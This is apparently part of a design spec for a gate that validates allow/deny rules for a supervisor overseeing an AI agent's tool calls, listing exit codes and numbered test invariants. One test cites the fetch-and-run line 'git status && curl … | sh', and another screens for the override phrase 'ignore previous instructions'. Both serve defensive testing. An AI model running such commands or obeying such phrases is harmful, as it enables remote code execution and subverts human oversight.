export interface AblationReport {
  clause_id: string;
  window: { decisions: number; days: number };
  changed: number;
  near_misses: number;             // relaxed-pattern hits (§5.5)
  lifetime_fires: number;          // reds: decides deterrent vs dead-weight
  evidence_class: 'in-service' | 'shadowed' | 'deterrent' | 'dead-weight?'
                | 'insufficient-exposure' | 'retire';
  shadowed_by?: { rung: number; rule: string };   // SC6: measured, not inferred
  lifetimeFires: number;           // injectable seam — SC7, unreliable without a
                                   // durable counter (log rotates at 4 MiB, 1 generation)
  retirement_candidate: boolean;   // changed === 0 AND level is green/yellow
  note?: string;                   // e.g. green-persistence caveat (§6.3)
}

export interface DisplacementDecision {
  tier: Tier;
  at_ceiling: boolean;
  ceiling: number;                 // 25
  rendered_count: number;          // deterministic-only clauses excluded (§5.3)
  target?: { id: string; value: number; level: Level };
  reduces_coverage: boolean;       // target is red/orange — governance's widening bar
                                   // applies to the human approval of this packet
  outcome: 'admit' | 'displace' | 'reject';
  displaced?: string;
}

export interface ValidationReport {
  candidate_id: string;
  direction: Direction;
  stages: StageResult[];
  replay?: ReplayDiff;
  displacement?: DisplacementDecision;
  fixture_path?: string;
  verdict: 'pass' | 'reject';
  reason?: string;                 // the first error code + message
  report_text: string;             // §4.4, verbatim
}

// ── the one entry point ───────────────────────────────────────────────
export function validate(c: ClauseCandidate, ctx: GateContext): ValidationReport;

export interface GateContext {
  corpus: Corpus;                  // accepted + audit clauses
  records: RecordStore;            // last N decisions, newest first
  evaluate: typeof import('../supervisor/evaluate').evaluate;  // SAME fn, injected
  window: number;                  // default 500
  ablationWindow: { decisions: 2000; days: 90 };
  ceilingPerTier: number;          // default 25
  now: Date;
}
```

Replay injections (all three replace a real dependency with a recorded one; none is a branch inside `evaluate`):

```ts
export interface RecordedClassifier { classify(call: Call): Verdict; }   // returns recorded
export interface RecordedEscalation { ask(call: Call): HumanAnswer; }    // returns recorded
export interface FrozenClock { now(): Date; }                            // record timestamp
```

---

## 9. Exit codes

`ss-gate validate <candidate.md>` — one candidate per invocation, so cron can parallelise and a failure names a file.

| Code | Meaning |
|---|---|
| 0 | Pass. Clause written at `status: audit`. Warnings may exist; they are in the report. |
| 10 | Schema hard error (E1–E4) |
| 20 | Static hard error (E5–E7, E9, E10) |
| 30 | Replay auto-reject (AR1–AR5 / E8), reason names which |
| 40 | Insufficient evidence to run the gate — window smaller than 100 decisions, or provenance records unresolvable. Not a rejection of the clause; a rejection of the *run*. Candidate stays `proposed`. |
| 50 | Ceiling / displacement rejection (E12) |
| 60 | Fixture error (E11) |
| 70 | Internal inconsistency — two `evaluate` definitions found, corpus clone diverged. **No longer includes reachable-with-zero-changes: that is AR5 `INERT`, exit 30 (SC3).** Loud on purpose: it means the gate cannot be trusted this run, and a gate that cannot be trusted must not pass anything. |

`ss-gate ablate` — 0 always on a successful run (retirement candidates are output, not an error), 40 if the ablation window is short, 70 internal.

---

## 10. Test invariants

Numbered, each a single failing assertion. These are the spec; the prose above is commentary.

1. A candidate with an uncompilable regex in `Match:` exits 10 and no clause file is written. (Bug 1)
2. `compilePatterns` returns the bad pattern in `dropped`; no caller ignores a non-empty `dropped`.
3. An **accepted** clause with a dropped pattern refuses to compile the hashed artifact (does not merely skip at load).
4. A candidate whose id collides with any corpus clause exits 10. (Bug 2)
5. `level: PURPLE` exits 10 and the string never reaches a prompt-rendering function. (Bug 3)
6. A malformed metadata table row exits 10; no citation string containing `|` is ever emitted. (Bug 4)
7. A `green` candidate matching `git status` exits 20 when history contains `git status && curl … | sh`. (Bug 5)
8. The same candidate anchored to the full line passes stage 2.
9. A `red` candidate matching one segment of a compound line passes with W5, not E5.
10. A pattern matching 6% of the window exits 20; 4% passes with a warning; 0% exits 20 as unreachable.
11. Breadth is computed over the union of patterns: three 2% patterns exit 20.
12. A candidate that would deny a call a human explicitly approved exits 30 with reason AR1.
13. A candidate that would allow a call a human explicitly denied exits 30 with reason AR1.
14. Exactly one definition of `evaluate` exists in the repo (import-graph assertion).
15. Replay makes zero model calls: with a throwing model client injected, a full 500-decision replay still completes.
16. Replay of the empty candidate set against unmodified history reproduces every recorded verdict for `verdict_source ∈ {human, clause}` exactly. (If this fails, every replay number is meaningless.)
17. A `verdict_source: model` difference is reported as advisory and never sets `verdict: reject`.
17b. A green candidate that would allow a `fallback` (fail-closed) deny **passes** AR3; the same candidate against a `human` or `clause` deny is rejected. (SC1)
17c. An uncited deny never triggers AR2; it falls through to AR3. (SC2)
17d. A 1-of-1 window at 100% churn does not trigger AR4; `N ≥ 100` is required. (SC4)
17e. A candidate matching ≥1 historical call with zero changes exits 30 as `INERT`, naming the pre-empting rung — never exit 70, never PASS. (SC3)
18. The report text matches §4.4 byte-for-byte for a fixed fixture, including pluralisation and the trailing `Fixture:` line.
19. Examples are deterministic: two runs over the same window produce identical example ordering.
20. `call_excerpt` in a report is redacted by the same redactor as `SupervisionRecord`.
21. Ablating a clause that is the sole cause of ≥1 recorded deny yields `changed > 0` and no retirement candidate.
22. Ablating a **green** clause with zero matches over the ablation window yields `retirement_candidate: true` with the window recorded in the evidence.
23. Two mutually-covering clauses do not both become retirement candidates in one run (one-at-a-time re-ablation).
24. `audit`-only shadow matches do not prevent a retirement candidate.
25. A green retirement candidate carries the settings-persistence note (§6.3).
26. At ceiling, a candidate with `replay.changed` below the weakest incumbent's value exits 50 and nothing is retired.
27. At ceiling, a stronger candidate produces one packet containing both the admission and `displaces: [target]`; the gate itself writes no retirement state — governance's `accept` does.
28. A learned clause never displaces a human clause; attempting it exits 50.
29. A widening candidate with 2 source records exits 20; with 3 across 2 sessions it passes.
30. A widening candidate whose pattern set is broader than its evidence exits 20 (E9); the narrowing equivalent passes with W5.
31. Provenance containing `ignore previous instructions` exits 20 (E10).
32. A candidate whose `source_record_ids` do not resolve exits 40, and the candidate remains `proposed`.
33. No candidate reaches `accepted` through any gate code path — grep invariant plus a functional test that the gate only ever writes `status: audit`.
34. There is no `--force` flag: an error is never downgradable from the CLI.
35. A fixture is written for every passing candidate, and the globbed fixture test passes immediately after.
36. Ablating a **red** clause with zero changes never produces `retirement_candidate: true`, in any window, for any evidence class.
37. A red with ≥1 fire that contributes a change is `in-service`; with matches but zero changes it is `shadowed`, and the report names the pre-empting rung and rule. (SC6)
37b. Shadowing is measured, not inferred: removing `team-git-002`'s `(?!-with-lease)` lookahead reclassifies identical records from `shadowed` to `in-service`.
37c. A red whose deny is merely reproduced by rung 7 is not `shadowed`.
37d. `deterrent` is reached only via injected `lifetimeFires`, and the report carries the aged-out caveat whenever it is used. (SC7 seam)
38. A red with zero lifetime fires and zero near-misses is classified `insufficient-exposure`; adding one near-miss to history reclassifies it `dead-weight?`.
39. Red ablation reads the lifetime record: shortening the configured ablation window does not change a red's classification.
40. The prompt selector excludes clauses whose patterns were evaluated and missed: a clause with a non-matching `Match:` line never appears in the rendered bundle, while the same clause with its `Match:` line removed does. (Positive design requirement on `des-runtime`'s selector, not a precondition to verify — the ceiling's justification depends on it.)
40b. A deterministic-only clause does not count against its tier's ceiling; the same clause without a `Match:` line does.
41. At ceiling with only reds and oranges in the tier, a candidate exits 50 and no eviction is proposed.
42. Displacement never crosses tiers: a candidate's eviction target always has the candidate's own tier.
43. A green candidate's displacement search never returns a red or orange target, in any tier state (same-tier invariant).
43b. A red-retiring **displacement packet** carries the deterrence caveat and the outgoing clause's evidence class; an ablation listing carries neither. (SC8)
44. Among two zero-citation greens, the one with the older `last_cited` is the eviction target.

---

### Deliberate simplifications

- One clause per invocation; no batch mode. Cron loops. `ponytail`: batch when a run exceeds a minute.
- Breadth index rebuilt per run rather than cached. It is a scan over 5,000 short strings.
- No scoring model for candidate quality. Evidence count is the score.
- Ceiling is a constant in config, not adaptive. Revisit when a real corpus hits 25 rendered clauses in a tier.
- Near-miss index is three string relaxations, not a similarity model. `ponytail`: upgrade when a real red gets misclassified.
